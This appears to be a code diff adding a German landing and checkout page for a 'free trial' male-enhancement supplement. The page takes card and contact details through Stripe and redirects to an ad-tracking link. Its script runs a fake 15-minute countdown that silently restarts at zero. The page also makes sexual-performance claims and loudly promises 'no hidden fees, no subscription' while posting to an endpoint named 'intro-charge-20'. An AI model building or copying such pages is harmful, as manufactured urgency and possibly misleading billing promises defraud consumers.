@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="de-DE">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TestoVate • Männliche Unterstützung – Gratis-Test (DE)</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet"/>
+<style>
+  :root{
+    --brand:#0f7ea8;       /* TestoVate Blau */
+    --brand-2:#ee9c00;     /* warmer Akzent */
+    --accent:#22a559;      /* Grün für Preise */
+    --ink:#0b1220;
+    --muted:#5b6472;
+    --line:#e5e7eb;
+    --radius:18px;
+    --product-bg:#F2F2F2;  /* an Produktbild angepasst */
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font:16px/1.5 Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+    color:var(--ink);
+    background: radial-gradient(1200px 600px at 10% -10%, #eef9ff 0%, #ffffff 55%, #fff7ec 100%);
+  }
+
+  /* dezente Effekte */
+  .sparkles{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+  .sparkles i{position:absolute;width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.9);box-shadow:0 0 20px rgba(15,126,168,.55),0 0 8px rgba(238,156,0,.35);animation:float 8s linear infinite}
+  .sparkles i:nth-child(2){width:8px;height:8px;animation-duration:10s;left:15%}
+  .sparkles i:nth-child(3){width:5px;height:5px;animation-duration:12s;left:70%}
+  .sparkles i:nth-child(4){width:7px;height:7px;animation-duration:9s;left:85%}
+  @keyframes float{0%{transform:translateY(120%)}100%{transform:translateY(-20%)}}
+
+  /* Hinweisband */
+  .ribbon{background:linear-gradient(90deg,var(--brand),#20b0f0);color:#fff;font-weight:900;text-transform:uppercase;letter-spacing:.3px;position:relative;z-index:2}
+  .ribbon .wrap{display:flex;align-items:center;gap:14px;padding:10px 16px;max-width:1200px;margin:0 auto}
+  .pill{background:rgba(255,255,255,.18);padding:5px 12px;border-radius:999px;border:1px solid rgba(255,255,255,.45)}
+  .timer{margin-left:auto;display:flex;gap:18px;font-weight:900}
+  .timer span{display:flex;gap:6px;align-items:center}
+
+  /* Hero */
+  .hero{position:relative;border-bottom:1px solid var(--line);}
+  .hero .wrap{max-width:1200px;margin:0 auto;padding:34px 16px;display:grid;grid-template-columns:1.15fr 1fr;gap:28px;align-items:center}
+  .brand{display:flex;align-items:center;gap:12px;font-weight:900;font-size:40px;letter-spacing:.2px}
+  .logoDot{width:30px;height:30px;border-radius:50%;background:var(--brand);position:relative;box-shadow:0 10px 30px rgba(15,126,168,.25)}
+  .logoDot:after{content:"";position:absolute;inset:6px 10px 6px 6px;border-radius:46% 14% 46% 46%/46% 14% 46% 46%;background:#fff;transform:rotate(-35deg)}
+  .hero h1{font-size:38px;margin:14px 0 10px}
+  .sub{font-size:18px;color:#2b3340}
+  .badges{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:16px}
+  .badge{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center;box-shadow:0 8px 26px rgba(15,126,168,.08)}
+  .badge b{display:block;margin-top:6px}
+  .product-hero{min-height:300px;border-radius:22px;border:1px solid var(--line);background:var(--product-bg) url('testovate.jpg') center/contain no-repeat;box-shadow:0 18px 50px rgba(15,126,168,.10)}
+
+  /* Highlight-Balken */
+  .flash{margin-top:16px;display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:12px;background:linear-gradient(90deg,rgba(32,176,240,.12),rgba(238,156,0,.16));backdrop-filter:saturate(140%)}
+  .flash strong{color:var(--brand)}
+
+  /* Main */
+  .main{max-width:1200px;margin:0 auto;padding:24px 16px;display:grid;grid-template-columns:1fr 420px;gap:24px}
+  @media (max-width:1000px){.hero .wrap{grid-template-columns:1fr}.main{grid-template-columns:1fr}}
+
+  .card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:0 8px 24px rgba(2,18,8,.06)}
+  .card .pad{padding:18px}
+
+  /* Angebotskacheln */
+  .offer{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  @media (max-width:720px){.offer{grid-template-columns:1fr}}
+  .tile{border:2px solid var(--line);border-radius:16px;padding:16px;position:relative}
+  .tile.pop{border-color:var(--brand);box-shadow:0 0 0 4px rgba(15,126,168,.14)}
+  .tile h4{margin:2px 0 6px}
+  .price{font-size:28px;font-weight:900;color:var(--accent)}
+  .strike{color:#96a0ad;text-decoration:line-through;font-weight:700}
+  .rtag{position:absolute;top:12px;left:12px;background:var(--brand-2);color:#fff;font-size:12px;padding:5px 10px;border-radius:999px}
+
+  /* Checkout */
+  .checkout .head{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);padding:14px 18px}
+  .checkout h3{margin:0;font-size:20px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .row > *{min-width:0}
+
+  .phone{display:flex;gap:10px;width:100%}
+  .phone select{flex:0 0 170px}
+  .phone input{flex:1 1 0%;min-width:0;width:100%}
+
+  .input,.el,select{width:100%;display:block;padding:12px 14px;border:1.6px solid var(--line);border-radius:12px;background:#fff;color:#000}
+  .input:focus,.el:focus,select:focus{outline:none;border-color:#cfefff;box-shadow:0 0 0 3px rgba(32,176,240,.18)}
+
+  .paybtn{width:100%;padding:16px 18px;border-radius:14px;background:linear-gradient(180deg,var(--brand),#0a5f80);color:#fff;font-weight:900;border:none;cursor:pointer;box-shadow:0 14px 30px rgba(15,126,168,.25)}
+  .paybtn:hover{filter:saturate(1.06) brightness(0.98)}
+  .muted{color:var(--muted);font-size:14px}
+  .trust{display:flex;gap:14px;justify-content:center;padding:12px;border-top:1px solid var(--line)}
+  .trust img{height:22px;opacity:.85}
+
+  .list{display:grid;gap:10px;margin-top:6px}
+  .list .li{display:flex;gap:10px}
+  .check{width:18px;height:18px;border-radius:4px;background:#e7f6ff;display:inline-flex;align-items:center;justify-content:center}
+  .check:after{content:"✓";font-size:12px;color:#0f7ea8}
+
+  .notice{border:1px dashed #bfe8ff;background:#f5fbff;color:#0a4a61;padding:10px 12px;border-radius:12px}
+
+  details{border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+  details+details{margin-top:10px}
+  summary{cursor:pointer;font-weight:700}
+
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;z-index:100}
+  .overlay[aria-hidden="false"]{display:flex}
+  .box{background:#fff;border-radius:16px;max-width:520px;width:92vw;padding:22px;text-align:center;box-shadow:0 10px 28px rgba(0,0,0,.3)}
+  .bar{height:10px;width:100%;background:#eef2f5;border-radius:999px;overflow:hidden;margin-top:10px}
+  .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--brand),#9fe2ff);animation:load 2.2s ease-in-out infinite;border-radius:inherit}
+  @keyframes load{0%{width:0%}60%{width:85%}100%{width:100%}}
+
+  #err{margin-top:10px;font-size:14px;color:#b00020;background:#fde9eb;border:1px solid #e5b2b8;border-radius:10px;padding:8px;display:none}
+  #err[aria-hidden="false"]{display:block}
+
+  footer{padding:30px 16px;color:#3b4450;border-top:1px solid var(--line);text-align:center}
+</style>
+</head>
+<body>
+  <!-- Top-Ribbon -->
+  <div class="ribbon">
+    <div class="wrap">
+      <div><span class="pill">Gratis-Test gestartet</span> Ihr erstes Fläschchen geht auf uns</div>
+      <div class="timer" aria-live="polite">
+        <span><strong id="hh">00</strong> Std</span>
+        <span><strong id="mm">15</strong> Min</span>
+        <span><strong id="ss">00</strong> Sek</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="sparkles" aria-hidden="true">
+      <i style="left:5%"></i><i></i><i></i><i></i>
+    </div>
+    <div class="wrap">
+      <div>
+        <div class="brand"><span class="logoDot"></span> TestoVate</div>
+        <h1>Männliche Unterstützung — Gratis-Fläschchen*</h1>
+        <p class="sub">Sie zahlen nur <b>2,50 €</b> Versand. <b>Keine versteckten Gebühren.</b> Kein Abo. Probieren Sie es aus und entscheiden Sie selbst.</p>
+        <div class="flash"><strong>Wobei es unterstützt:</strong> gesunde Durchblutung & Stickoxid-Wege, Ausdauer & Energie, Libido & Selbstvertrauen sowie allgemeines sexuelles Wohlbefinden.</div>
+        <div class="badges">
+          <div class="badge">💪 <b>Ausdauer & Leistung</b></div>
+          <div class="badge">❤️ <b>Durchblutungs-Support</b></div>
+          <div class="badge">🔥 <b>Libido & Verlangen</b></div>
+          <div class="badge">🧠 <b>Energie & Fokus</b></div>
+        </div>
+      </div>
+      <div class="product-hero" role="img" aria-label="TestoVate Produktabbildung"></div>
+    </div>
+  </section>
+
+  <!-- Hauptinhalt -->
+  <section class="main">
+    <!-- Links: Angebot & Vorteile -->
+    <div class="card">
+      <div class="pad">
+        <div class="offer">
+          <div class="tile pop">
+            <span class="rtag">Ihr Gratis-Test</span>
+            <h4>1× TestoVate Männliche Unterstützung (60 Kapseln)</h4>
+            <div class="strike">39,95 €</div>
+            <div class="price">0,00 € heute</div>
+            <p class="muted">Nur <b>2,50 €</b> Versand an der Kasse — das war’s.</p>
+          </div>
+          <div class="tile">
+            <h4>Warum wir das anbieten</h4>
+            <p>Wir glauben an unsere Formel. Testen Sie ein Vollformat-Fläschchen zum reinen Versandpreis. Keine wiederkehrenden Abbuchungen, keine versteckten Kosten — niemals.</p>
+          </div>
+          <div class="tile">
+            <h4>Transparenz-Versprechen</h4>
+            <div class="list">
+              <div class="li"><span class="check"></span><div><b>Einmalige</b> Versandgebühr von 2,50 €</div></div>
+              <div class="li"><span class="check"></span><div><b>Kein Abo</b> wird Ihrer Bestellung hinzugefügt</div></div>
+              <div class="li"><span class="check"></span><div><b>30-Tage-Zufriedenheit</b> oder Erstattung der Versandkosten</div></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:14px">
+          <div class="pad">
+            <h3>Wie TestoVate helfen kann</h3>
+            <div class="list">
+              <div class="li"><span class="check"></span><div><b>Unterstützt eine gesunde Durchblutung</b> und Stickoxid-Signalwege, die mit Erregung und Performance zusammenhängen.*</div></div>
+              <div class="li"><span class="check"></span><div><b>Hilft, Ausdauer & Energie</b> zu unterstützen – bereit sein, wenn es zählt.*</div></div>
+              <div class="li"><span class="check"></span><div><b>Unterstützt Libido & Selbstvertrauen</b> mit täglichen, leicht einzunehmenden Kapseln im Rahmen eines gesunden Lebensstils.*</div></div>
+              <div class="li"><span class="check"></span><div><b>Hohe Qualitätsstandards,</b> ohne Gentechnik und in GMP-konformen Anlagen hergestellt.</div></div>
+            </div>
+            <p class="notice" role="note"><b>Wichtig:</b> Nahrungsergänzungsmittel können keine dauerhaften Veränderungen der Penisgröße garantieren. Ergebnisse variieren. Diese Angaben dienen dem allgemeinen Wohlbefinden und wurden nicht von einer Gesundheitsbehörde bewertet. Dieses Produkt ist nicht zur Diagnose, Behandlung, Heilung oder Vorbeugung von Krankheiten bestimmt.</p>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:14px">
+          <div class="pad">
+            <h3>FAQ</h3>
+            <details>
+              <summary>Ist es wirklich kostenlos?</summary>
+              <p>Ja. Ihr erstes Fläschchen ist gratis. Sie zahlen nur eine <b>einmalige</b> Versandgebühr von <b>2,50 €</b>. Es gibt <b>keine</b> versteckten Kosten und <b>kein</b> automatisches Abo.</p>
+            </details>
+            <details>
+              <summary>Wie nehme ich es ein?</summary>
+              <p>Täglich 2 Kapseln mit Wasser einnehmen, am besten zu einer Mahlzeit.</p>
+            </details>
+            <details>
+              <summary>Erhöht es die Größe?</summary>
+              <p>TestoVate unterstützt Durchblutung, Erregung und Performance. Einige Anwender berichten über verbesserte Festigkeit und Fülle bei Erregung; dauerhafte Größenänderungen sind jedoch nicht belegt.</p>
+            </details>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Rechts: Checkout -->
+    <div class="card checkout" id="checkoutCard">
+      <div class="head">
+        <h3>Mein Gratis-Fläschchen sichern</h3>
+        <div class="muted">Sichere Zahlung</div>
+      </div>
+      <div class="pad">
+        <div class="row" style="margin-bottom:8px">
+          <input id="emailInput" class="input" type="email" placeholder="E-Mail-Adresse"/>
+          <input id="nameInput" class="input" placeholder="Vollständiger Name"/>
+        </div>
+        <div style="margin-bottom:8px">
+          <div class="phone">
+            <select id="phonePrefix" class="input" aria-label="Ländervorwahl"></select>
+            <input id="phoneNumber" class="input" type="tel" inputmode="tel" placeholder="Telefonnummer"/>
+          </div>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingStreet" class="input" placeholder="Adresse (Zeile 1)"/>
+          <input id="billingCity" class="input" placeholder="Stadt"/>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingPostcode" class="input" placeholder="Postleitzahl"/>
+          <select id="billingCountry" class="input"></select>
+        </div>
+
+        <div class="muted" style="margin:8px 0 4px">Kartennummer (für Versand 2,50 €)</div>
+        <div id="card-number" class="el"></div>
+        <div class="row" style="margin-top:8px">
+          <div>
+            <div class="muted" style="margin:8px 0 4px">Ablaufdatum</div>
+            <div id="card-expiry" class="el"></div>
+          </div>
+          <div>
+            <div class="muted" style="margin:8px 0 4px">CVC</div>
+            <div id="card-cvc" class="el"></div>
+          </div>
+        </div>
+
+        <div class="notice" style="margin-top:10px">
+          <b>Keine versteckten Gebühren.</b> Heute wird nur <b>2,50 €</b> für den Versand berechnet.
+        </div>
+
+        <div id="err" role="alert" aria-hidden="true"></div>
+
+        <button id="payNow" class="paybtn" style="margin-top:12px">Mein Gratis-Fläschchen sichern</button>
+        <p class="muted" style="margin:10px 0 0">🔒 256-Bit SSL-gesicherte Zahlung</p>
+      </div>
+      <div class="trust">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa"/>
+        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard"/>
+        <img src="https://charmr.xyz/logos/amex.png" alt="Amex"/>
+        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay"/>
+      </div>
+    </div>
+  </section>
+
+  <!-- Lade-Overlay -->
+  <div id="overlay" class="overlay" aria-hidden="true">
+    <div class="box">
+      <h3>Zahlung wird verarbeitet…</h3>
+      <div class="bar"><span></span></div>
+      <p class="muted">Bitte einen Moment Geduld.</p>
+    </div>
+  </div>
+
+  <footer>
+    <b>Hinweis:</b> Diese Aussagen wurden nicht von einer Gesundheitsbehörde bewertet. TestoVate ist nicht zur Diagnose, Behandlung, Heilung oder Vorbeugung von Krankheiten bestimmt. Sprechen Sie mit einer medizinischen Fachperson, wenn Sie Medikamente einnehmen oder Vorerkrankungen haben.
+  </footer>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    /* Countdown */
+    (function countdownLoop(){
+      const hh=document.getElementById('hh'), mm=document.getElementById('mm'), ss=document.getElementById('ss');
+      const DURATION_MS = 15*60*1000;
+      let end = Date.now() + DURATION_MS;
+      const fmt=n=>String(n).padStart(2,'0');
+      (function tick(){
+        const left = Math.max(0, end - Date.now());
+        const s = Math.floor(left/1000)%60;
+        const m = Math.floor(left/60000)%60;
+        const h = Math.floor(left/3600000);
+        hh.textContent=fmt(h); mm.textContent=fmt(m); ss.textContent=fmt(s);
+        if(left<=0){ end = Date.now() + DURATION_MS; }
+        requestAnimationFrame(tick);
+      })();
+    })();
+
+    /* Nur Deutschland (+49) */
+    const ALLOWED = { DE: { prefix: '+49', name: 'Deutschland' } };
+
+    function populateAllowed(selectEl) {
+      if(!selectEl) return;
+      selectEl.innerHTML = '';
+      const opt = new Option(`${ALLOWED.DE.prefix} — ${ALLOWED.DE.name}`, ALLOWED.DE.prefix, true, true);
+      opt.dataset.cc = 'DE';
+      selectEl.add(opt);
+    }
+
+    function populateCountries(countrySel){
+      if(!countrySel) return;
+      countrySel.innerHTML = '';
+      const opt = new Option('Deutschland', 'DE', true, true);
+      countrySel.add(opt);
+    }
+
+    (function initGeoUI(){
+      populateAllowed(document.getElementById('phonePrefix'));
+      populateCountries(document.getElementById('billingCountry'));
+      const phoneEl  = document.getElementById('phoneNumber');
+      if (phoneEl) { phoneEl.disabled=false; phoneEl.readOnly=false; }
+    })();
+
+    /* Endpoint (wie auf Ihren anderen Seiten) */
+    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+
+    const stripe = Stripe(PUBLISHABLE_KEY);
+    const elements = stripe.elements();
+    const cardNumber=elements.create("cardNumber");
+    const cardExpiry=elements.create("cardExpiry");
+    const cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");
+
+    const $err=document.getElementById("err");
+    const overlay=document.getElementById('overlay');
+    const showError=m=>{$err.textContent=m;$err.setAttribute('aria-hidden','false');}
+    const hideError=()=>{$err.textContent="";$err.setAttribute('aria-hidden','true');}
+    const showLoading=()=>overlay.setAttribute('aria-hidden','false');
+    const hideLoading=()=>overlay.setAttribute('aria-hidden','true');
+
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const phoneNumber=document.getElementById('phoneNumber');
+    const billingStreet=document.getElementById('billingStreet');
+    const billingCity=document.getElementById('billingCity');
+    const billingPostcode=document.getElementById('billingPostcode');
+
+    document.getElementById("payNow").onclick = async () => {
+      hideError(); showLoading();
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const fullPhone = rawPhone ? `+49${rawPhone}` : undefined;
+
+      const addr = {
+        line1:(billingStreet?.value||'').trim()||undefined,
+        city:(billingCity?.value||'').trim()||undefined,
+        postal_code:(billingPostcode?.value||'').trim()||undefined,
+        country:'DE'
+      };
+
+      const pm = await stripe.createPaymentMethod({
+        type:"card",
+        card:cardNumber,
+        billing_details:{
+          name:nameInput.value||undefined,
+          email:emailInput.value||undefined,
+          phone:fullPhone,
+          address:addr
+        }
+      });
+      if(pm.error){ hideLoading(); showError(pm.error.message); return; }
+
+      try{
+        const res = await fetch(SUBSCRIBE_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            paymentMethodId:pm.paymentMethod.id,
+            name:nameInput.value,
+            email:emailInput.value,
+            phone:fullPhone,
+            address:addr,
+            amount:250 // 2,50 € in Cent
+          })
+        });
+        const data = await res.json();
+        if(data.error){ hideLoading(); showError(data.error); return; }
+        if(!data.clientSecret){ hideLoading(); showError("Zahlung fehlgeschlagen"); return; }
+
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error){ hideLoading(); showError(conf.error.message); return; }
+        if(!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){
+          hideLoading(); showError("Zahlung nicht abgeschlossen"); return;
+        }
+
+        window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7?";
+      }catch(e){ hideLoading(); showError(e.message||"Etwas ist schiefgelaufen"); }
+    };
+  </script>
+
+  <!-- GoAffPro loader (Tracking) -->
+  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+</body>
+</html>
